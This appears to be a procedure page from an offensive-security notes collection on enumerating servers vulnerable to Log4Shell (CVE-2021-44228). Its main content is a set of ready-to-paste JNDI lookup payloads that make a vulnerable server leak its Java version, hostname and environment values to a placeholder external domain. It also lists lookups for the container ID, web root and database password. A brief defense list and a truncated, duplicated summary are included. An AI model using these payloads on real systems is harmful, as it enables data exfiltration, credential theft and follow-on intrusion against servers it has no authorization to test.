---
id: fd8a5df1-d188-4971-a05f-b1d5af814774
name: CVE-2021-44228 Log4Shell Enumeration
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:56.674207+00:00'
updated_at: '2023-04-06T03:55:56.689205+00:00'
tags:
- '[[CVE-2021-44228 Log4Shell]]'
- '[[Payloads]]'
commands:
- '[[Identify Java version and hostname]]'
- '[[More enumerations keywords and variables]]'
---

# CVE-2021-44228 Log4Shell Enumeration

## Summary

This procedure aims to enumerate information from a vulnerable Log4j server. By exploiting the Log4Shell vulnerability, an attacker can execute arbitrary code on the server. This enumeration procedure can be used to identify the Java version, hostname, and other environment variables that can be la

## Description

# Description

This procedure aims to enumerate information from a vulnerable Log4j server. By exploiting the Log4Shell vulnerability, an attacker can execute arbitrary code on the server. This enumeration procedure can be used to identify the Java version, hostname, and other environment variables that can be later used to craft a more targeted attack. 

## Requirements

1. Access to a vulnerable Log4j server.

## Defense

1. Apply the latest patch for the Log4j vulnerability.

1. Monitor for suspicious network traffic.

1. Implement network segmentation to limit the impact of a successful attack.

## Objectives

1. Identify Java version and hostname from a vulnerable Log4j server.

# Instructions

1. Copy and paste the above commands into a terminal and execute them to enumerate information from a vulnerable Log4j server.

**Code**: [[# Identify Java version and hostname
${jndi:ldap:/]]

> This command uses JNDI lookup to retrieve information from the server. The variables used in the command can be modified to enumerate other environment variables, such as the operating system, Docker container ID, web root directory, and database passwords.

**Command** ([[Identify Java version and hostname]]):

```bash
${jndi:ldap://${java:version}.domain/a}
${jndi:ldap://${env:JAVA_VERSION}.domain/a}
${jndi:ldap://${sys:java.version}.domain/a}
${jndi:ldap://${sys:java.vendor}.domain/a}
${jndi:ldap://${hostName}.domain/a}
${jndi:dns://${hostName}.domain}
```

**Command** ([[More enumerations keywords and variables]]):

```bash
java:os
docker:containerId
web:rootDir
bundle:config:db.password
```

## Commands Used

- [[Identify Java version and hostname]]
- [[More enumerations keywords and variables]]

## Tags

- [[CVE-2021-44228 Log4Shell]]
- [[Payloads]]
